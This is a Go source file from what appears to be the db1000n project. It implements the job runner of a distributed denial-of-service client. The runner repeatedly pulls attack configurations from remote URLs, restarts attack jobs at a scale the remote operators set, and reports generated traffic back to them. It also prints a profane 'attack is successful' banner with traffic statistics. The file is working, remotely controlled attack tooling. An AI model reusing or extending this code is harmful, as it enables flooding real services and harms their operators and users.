// Package runner [responsible for updating the config and managing jobs accordingly]
package runner

import (
	"bytes"
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"text/tabwriter"
	"time"

	"github.com/google/uuid"
	"go.uber.org/zap"

	"github.com/Arriven/db1000n/src/jobs"
	"github.com/Arriven/db1000n/src/runner/config"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
	"github.com/Arriven/db1000n/src/utils/templates"
)

// Config for the job runner
type Config struct {
	ConfigPaths    []string          // Comma-separated config location URLs
	BackupConfig   []byte            // Raw backup config
	RefreshTimeout time.Duration     // How often to refresh config
	Format         string            // json or yaml
	Global         jobs.GlobalConfig // meant to pass cmdline and other args to every job
}

// Runner executes jobs according to the (fetched from remote) configuration
type Runner struct {
	config         *Config
	configPaths    []string
	refreshTimeout time.Duration
	configFormat   string
}

// New runner according to the config
func New(cfg *Config) (*Runner, error) {
	return &Runner{
		config:         cfg,
		configPaths:    cfg.ConfigPaths,
		refreshTimeout: cfg.RefreshTimeout,
		configFormat:   cfg.Format,
	}, nil
}

// Run the runner and block until Stop() is called
func (r *Runner) Run(ctx context.Context, logger *zap.Logger) {
	ctx = context.WithValue(ctx, templates.ContextKey("global"), r.config.Global)
	clientID := uuid.MustParse(r.config.Global.ClientID)

	metrics.IncClient()

	refreshTimer := time.NewTicker(r.refreshTimeout)

	defer refreshTimer.Stop()

	var cancel context.CancelFunc

	lastKnownConfig := &config.RawConfig{Body: r.config.BackupConfig}

	for {
		rawConfig := config.FetchRawConfig(r.configPaths, lastKnownConfig)

		if !bytes.Equal(lastKnownConfig.Body, rawConfig.Body) { // Only restart jobs if the new config differs from the current one
			cfg := config.Unmarshal(rawConfig.Body, r.configFormat)
			if cfg != nil {
				lastKnownConfig = rawConfig

				if cancel != nil {
					cancel()
				}

				cancel = r.runJobs(ctx, logger, cfg)
			}
		} else {
			log.Println("The config has not changed. Keep calm and carry on!")
		}

		// Wait for refresh timer or stop signal
		select {
		case <-refreshTimer.C:
		case <-ctx.Done():
			if cancel != nil {
				cancel()
			}

			return
		}

		dumpMetrics(clientID.String(), r.config.Global.Debug)
	}
}

func (r *Runner) runJobs(ctx context.Context, logger *zap.Logger, cfg *config.Config) (cancel context.CancelFunc) {
	ctx, cancel = context.WithCancel(ctx)

	var jobInstancesCount int

	for i := range cfg.Jobs {
		if len(cfg.Jobs[i].Filter) != 0 && strings.TrimSpace(templates.ParseAndExecute(logger, cfg.Jobs[i].Filter, ctx)) != "true" {
			logger.Info("There is a filter defined for a job but this client doesn't pass it - skip the job")

			continue
		}

		job := jobs.Get(cfg.Jobs[i].Type)
		if job == nil {
			logger.Error("unknown job", zap.String("type", cfg.Jobs[i].Type))

			continue
		}

		if cfg.Jobs[i].Count < 1 {
			cfg.Jobs[i].Count = 1
		}

		if r.config.Global.ScaleFactor > 0 {
			cfg.Jobs[i].Count *= r.config.Global.ScaleFactor
		}

		cfgMap := make(map[string]interface{})
		if err := utils.Decode(cfg.Jobs[i], &cfgMap); err != nil {
			logger.Fatal("failed to encode cfg map")
		}

		ctx := context.WithValue(ctx, templates.ContextKey("config"), cfgMap)

		for j := 0; j < cfg.Jobs[i].Count; j++ {
			go func(i int) {
				_, err := job(ctx, logger, r.config.Global, cfg.Jobs[i].Args)
				if err != nil {
					logger.Error("error running job", zap.Error(err))
				}
			}(i)

			jobInstancesCount++
		}
	}

	log.Printf("%d job instances (re)started", jobInstancesCount)

	return cancel
}

func dumpMetrics(clientID string, debug bool) {
	defer func() {
		if err := recover(); err != nil {
			log.Printf("caught panic: %v", err)
		}
	}()

	bytesGenerated := metrics.Default.Read(metrics.Traffic)
	bytesProcessed := metrics.Default.Read(metrics.ProcessedTraffic)

	if err := utils.ReportStatistics(int64(bytesGenerated), clientID); err != nil && debug {
		log.Println("error reporting statistics:", err)
	}

	networkStatsWriter := tabwriter.NewWriter(os.Stdout, 1, 1, 1, ' ', tabwriter.AlignRight)

	if bytesGenerated > 0 {
		fmt.Fprintln(networkStatsWriter, "\n\n!Атака проводиться успішно! Руський воєнний корабль іди нахуй!")
		fmt.Fprintln(networkStatsWriter, "!Attack is successful! Russian warship, go fuck yourself!")

		const BytesInMegabytes = 1024 * 1024
		megabytesGenerated := float64(bytesGenerated) / BytesInMegabytes
		megabytesProcessed := float64(bytesProcessed) / BytesInMegabytes

		const PercentConversionMultilpier = 100
		responsePercent := float64(bytesProcessed) / float64(bytesGenerated) * PercentConversionMultilpier

		fmt.Fprint(networkStatsWriter, "---------Traffic stats---------\n")
		fmt.Fprintf(networkStatsWriter, "[\tGenerated\t]\t%.2f\tMB\t|\t%v \tbytes\n", megabytesGenerated, bytesGenerated)
		fmt.Fprintf(networkStatsWriter, "[\tReceived\t]\t%.2f\tMB\t|\t%v \tbytes\n", megabytesProcessed, bytesProcessed)
		fmt.Fprintf(networkStatsWriter, "[\tResponse rate\t]\t%.1f\t%%\n", responsePercent)
		fmt.Fprint(networkStatsWriter, "-------------------------------\n\n")
	} else {
		fmt.Fprintln(networkStatsWriter, "[Error] No traffic generated. If you see this message a lot - contact admins")
	}

	networkStatsWriter.Flush()
}
